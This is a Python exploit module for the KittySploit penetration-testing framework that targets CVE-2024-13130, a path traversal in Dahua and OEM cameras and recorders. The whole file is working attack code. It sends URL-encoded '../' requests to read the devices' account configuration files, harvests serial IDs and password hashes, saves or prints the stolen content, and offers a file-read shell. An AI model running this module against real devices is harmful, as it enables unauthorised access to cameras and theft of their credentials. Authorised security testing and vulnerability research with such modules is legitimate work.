#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Dahua/OEM path traversal to account config (CVE-2024-13130)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.lfi import Lfi


class Module(Auxiliary, Http_client, Lfi):
    __info__ = {
        'name': 'Dahua Devices - Path Traversal Account Dump (CVE-2024-13130)',
        'description': (
            'Exploits path traversal to ../mtd/Config/Sha1Account1 (or Account1) on '
            'Dahua and OEM devices, leaking SerialID and Password hashes.'
        ),
        'author': ['KittySploit Team'],
        'cve': ['CVE-2024-13130'],
        'platform': Platform.LINUX,
        'references': [
            'https://netsecfish.notion.site/Path-Traversal-Vulnerability-in-IntelBras-IP-Cameras-mtd-Config-Sha1Account1-and-mtd-Confi-15e6b683e67c80809442ee3425f753b7',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-13130',
        ],
        'tags': ['dahua', 'camera', 'nvr', 'iot', 'lfi', 'file-read', 'cve-2024-13130'],
        'agent': {
            'risk': 'intrusive',
            'effects': ['data_exfiltration'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': True,
            'produces': ['risk_signals'],
            'cost': 1.2,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['scanner/http/cve_2024_13130_detect'],
            },
        },
    }
    file_read = OptString(
        '/mtd/Config/Sha1Account1',
        'Device config path (prefixed with ../ automatically)',
        required=True,
    )
    output_file = OptString('', 'Local file to write retrieved content', required=False)
    output_limit = OptInteger(12000, 'Max chars to print when output_file empty (0=full)', required=False, advanced=True)

    def execute(self, file_path: str) -> str:
        remote = str(file_path or '').strip()
        if not remote.startswith('/'):
            remote = '/' + remote
        # Encode to avoid requests URL normalization of ../
        path = f'/%2e%2e{remote}'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return ''
        return r.text or ''

    def check(self):
        for candidate in ('/mtd/Config/Sha1Account1', '/mtd/Config/Account1'):
            body = self.execute(candidate)
            if '"SerialID"' in body and '"Password"' in body:
                return {
                    'vulnerable': True,
                    'reason': f'CVE-2024-13130 confirmed via {candidate}',
                    'confidence': 'high',
                }
        return {
            'vulnerable': False,
            'reason': 'Account config not readable',
            'confidence': 'medium',
        }

    def run(self):
        if self.shell_lfi:
            print_status('Path-traversal file-read shell')
            self.handler_lfi()
            return True

        remote = str(self.file_read or '').strip()
        data = self.execute(remote)
        if not data:
            # Fallback to known account files
            for candidate in ('/mtd/Config/Sha1Account1', '/mtd/Config/Account1'):
                data = self.execute(candidate)
                if data and '"Password"' in data:
                    remote = candidate
                    break
        if not data:
            print_error('File read failed')
            return False

        print_success(f'Read {len(data)} bytes from ..{remote}')
        local = str(self.output_file or '').strip()
        if local:
            try:
                with open(local, 'w', encoding='utf-8', errors='ignore') as fh:
                    fh.write(data)
                print_success(f'Wrote content to {local}')
            except OSError as e:
                print_error(f'Could not write output_file: {e}')
                return False
        else:
            limit = int(self.output_limit or 0)
            print_info(data if not limit or len(data) <= limit else data[:limit] + '\n... [truncated]')
        return True
